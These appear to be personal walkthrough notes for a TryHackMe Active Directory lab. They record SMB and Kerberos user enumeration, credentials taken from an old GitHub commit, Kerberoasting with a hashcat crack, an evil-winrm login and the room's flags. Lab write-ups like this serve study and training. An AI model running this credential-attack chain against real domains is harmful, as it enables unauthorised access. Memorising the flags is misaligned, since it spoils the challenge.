user
`THM{ed882d02b34246536ef7da79062bef36}`
ROOT
`THM{1a1fa94875421296331f145971ca4881}`

## Enterprise AD machine
- get the domain name
```bash
crackmapexec smb 10.10.243.67                                                         
SMB         10.10.243.67    445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
```

- Enumerate users
```bash
../Downloads/kerbrute_linux_amd64 userenum -d LAB.ENTERPRISE.THM --dc 10.10.243.67 ../thm/attacktive/users.txt
```
```bash

```
- nmap

web: 


http://10.10.243.67:80/
http://10.10.243.67:5357/

```bash
smvclient -L \\\\$ip\\
smvclient -L \\\\$ip\\share
```
- we got two encrypted files from share called share 

```bash
office2john RSA-Secured-Credentials.xlsx > creds_hash.txt
                                                                                                                                                                                
┌──(kali㉿kali)-[~/enterprise]
└─$ cat creds_hash.txt                                                                    
RSA-Secured-Credentials.xlsx:$office$*2013*100000*256*16*95f4b8616169cc40904836f94aa3524f*ebfc9c7c926ba55752740a60ee7cf222*4ec8ea0badcf0dd4b3f44993a9d5cdf0fc215d03d7b519bc16327bacdb992819
                                                                                                                                                                                
┌──(kali㉿kali)-[~/enterprise]
└─$ office2john RSA-Secured-Document-PII.docx > pii_hash.txt                   
                                                                                                                                                                                
┌──(kali㉿kali)-[~/enterprise]
└─$ cat pii_hash.txt 
RSA-Secured-Document-PII.docx:$office$*2013*100000*256*16*c6a4a0961d1c0afa60022558596776a5*6469c6e890f779b7dd5a16e784b7c020*626bd8c35bf1c50f40a640ee755eb89b569594aa1b7c3402cde6761249e1e931

```


sid : S-1-5-21-2168718921-3906202695-65158103-1000
`\LAB-ADMIN\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D`
`\LAB-ADMIN\AppData\Roaming\Microsoft\Protect\S-1-5-21-2168718921-3906202695-65158103-1000\655a0446-8420-431a-a5d7-2d18eb87b9c3` 
`\LAB-ADMIN\AppData\Roaming\Microsoft\Protect\S-1-5-21-2168718921-3906202695-65158103-1000\Preferred`



- osint to get creds from github repo (old commits)

`nik`:`ToastyBoi!`
```bash
┌──(kali㉿kali)-[~/enterprise]
crackmapexec smb 10.10.13.6 -u nik -p 'ToastyBoi!' --shares
SMB         10.10.13.6      445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
SMB         10.10.13.6      445    LAB-DC           [+] LAB.ENTERPRISE.THM\nik:ToastyBoi! 
SMB         10.10.13.6      445    LAB-DC           [+] Enumerated shares
SMB         10.10.13.6      445    LAB-DC           Share           Permissions     Remark
SMB         10.10.13.6      445    LAB-DC           -----           -----------     ------
SMB         10.10.13.6      445    LAB-DC           ADMIN$                          Remote Admin
SMB         10.10.13.6      445    LAB-DC           C$                              Default share
SMB         10.10.13.6      445    LAB-DC           Docs            READ            
SMB         10.10.13.6      445    LAB-DC           IPC$            READ            Remote IPC
SMB         10.10.13.6      445    LAB-DC           NETLOGON        READ            Logon server share 
SMB         10.10.13.6      445    LAB-DC           SYSVOL          READ            Logon server share 
SMB         10.10.13.6      445    LAB-DC           Users           READ            Users Share. Do Not Touch!
```

```bash
crackmapexec smb 10.10.13.6 -u nik -p 'ToastyBoi!' --users 
SMB         10.10.13.6      445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
SMB         10.10.13.6      445    LAB-DC           [+] LAB.ENTERPRISE.THM\nik:ToastyBoi! 
SMB         10.10.13.6      445    LAB-DC           [+] Enumerated domain user(s)
SMB         10.10.13.6      445    LAB-DC           LAB.ENTERPRISE.THM\joiner                         badpwdcount: 0 desc: 
SMB         10.10.13.6      445    LAB-DC           LAB.ENTERPRISE.THM\varg                           badpwdcount: 0 desc: 
SMB         10.10.13.6      445    LAB-DC           LAB.ENTERPRISE.THM\contractor-temp                badpwdcount: 0 desc: Change password from Password123!
SMB         10.10.13.6      445    LAB-DC           LAB.ENTERPRISE.THM\Cake                           badpwdcount: 0 desc: 
SMB         10.10.13.6      445    LAB-DC           LAB.ENTERPRISE.THM\banana                         badpwdcount: 0 desc: 
SMB         10.10.13.6      445    LAB-DC           LAB.ENTERPRISE.THM\korone                         badpwdcount: 0 desc: 
SMB         10.10.13.6      445    LAB-DC           LAB.ENTERPRISE.THM\spooks                         badpwdcount: 0 desc: 
SMB         10.10.13.6      445    LAB-DC           LAB.ENTERPRISE.THM\replication                    badpwdcount: 0 desc: 
SMB         10.10.13.6      445    LAB-DC           LAB.ENTERPRISE.THM\nik                            badpwdcount: 0 desc: 
SMB         10.10.13.6      445    LAB-DC           LAB.ENTERPRISE.THM\bitbucket                      badpwdcount: 0 desc: 
SMB         10.10.13.6      445    LAB-DC           LAB.ENTERPRISE.THM\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         10.10.13.6      445    LAB-DC           LAB.ENTERPRISE.THM\atlbitbucket                   badpwdcount: 0 desc: 
SMB         10.10.13.6      445    LAB-DC           LAB.ENTERPRISE.THM\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain                                                                                                                                                                             
SMB         10.10.13.6      445    LAB-DC           LAB.ENTERPRISE.THM\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain 
```


- Kerberoasting

```bash
$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$LAB.ENTERPRISE.THM/bitbucket*$4183aa9fb1a2215e71450533dc57ac47$dfde26d47a55920c1e54a7ac2cb79a6448c1561f5c3458a638551b079ad3e9d38ff2b5247fb48974623f10b04d4453c7da23b701894d4095658e94b8fbaa4c3a21be017164d275cebe6871f9ad78b5504cdfba8c98f0f18f21791e24ab659242b20319ad489e16e433c2b1bf7deaf01a7abd0bb560ad1a5f93f7a41269c3b5f799136556fa97db0ac10c34694837a015c830e54ccdf6b50611b84919cee673741adbc6e502514dd56565eae9d3cd797798bbc4b28c59632b2a493d00f131b2a18539f2e73f06d41cc3fb1eed7bcee4af3cda03738df5dcdffe2734b704436fe0c07aa7fa03fc0eafda70ff27961589cb78f29a9839b1291b52131502f2e8cc6ed74cbfe128ccdae442dc2301614a00e99383b2b77eee65622337ddce01e9a2ab5defdb1c4972bd4b550223c9adb2460fd6d96bad480a07a6d9c86e172aaac6c541c6fabaf839b16f348c1af96cd4bc4c284d1e276b0565ceb61185c61a7faa9156530184ddcda21450c07f19ec37983dbea9975222ef5b1968f7f13d11a039a4df2516f1cec69f1823901309861384e04c119240a3466d24de0f76034b606161c466ed2aec045fcb4e166496a5b68f04828164afb7f9560ce426346c45c3e9ab954006a7f4a3ccfce4ddcafb814003425fc2d23cee27e7b1271118b76d4922c18caea2e927ea208d65d9d365b114333015f1fbc2cf4c2ad5a951052382517bbba9d74f6f5cffb3ea0eaf1dbedb3a31faeaa9788e209b6cd4f676f48addd82a2e56a93ba679dad0ad0f2f1de56c5a04f3e9f06c68f0c5a8d39c02bafa7594691eb58bcb15a3939c68096309479006738fe8f3e865036d8c5558acca44dccfa9bbded0291592987203c85674c8515da2b6df427535cc820664c3a2b61978f2b5d13097f7cb510f8e04106fde072a9d649e7b387910c7ed5d427cdddbfa0c132e996a1c8ef93bc64ce5e28b4235625c8673fac35c101139bb372dd26eab3390e45149e9da574dda9ac3d14430d26b7e8cb104764e3b17295c3907339e577249bd881d1d655f069ca44d4559cfd7f54bc9d886df43e5d03ad0872ac17edc52d7ccb14cf5fcf901e645182639b3a2b35be7f131f6e090b332022904a765415d3e66b0c13ff23de975e93288afdc6c6f8d89e5e0d6cddc31415b96d939792b6b24f1ecabeec3bc6632e24e695bccd84f1709a61c6d0ea5a2c1e7f110290d1db1248b234492ebd90ca283bf03b9f778766a34ba20ff190fd4c739ec30c6b051be1dc3713810e048adb4788f424a59a6fd27ad503a152c6062f777831056e46aaab2d07e3ca2d2251862fa660e710255ae5c58eec24c12151e3a8af3a9390a1b1c250780724e0c
```
```bash
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```
`bitbucket`:`littleredbucket`
evil-winrm -i $ip -u bitbucket -p littleredbucket
